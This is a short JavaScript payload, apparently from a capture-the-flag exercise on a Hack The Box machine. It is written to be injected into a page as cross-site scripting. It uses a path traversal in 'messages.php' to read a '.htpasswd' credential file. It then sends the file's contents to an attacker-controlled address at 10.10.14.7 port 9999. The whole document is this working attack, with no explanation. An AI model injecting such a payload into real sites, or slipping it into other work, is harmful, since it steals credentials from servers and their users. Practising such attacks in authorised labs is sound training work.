<script>
fetch("http://alert.htb/messages.php?file=../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.7:9999/?file_content=" + encodeURIComponent(data));
  });
</script>
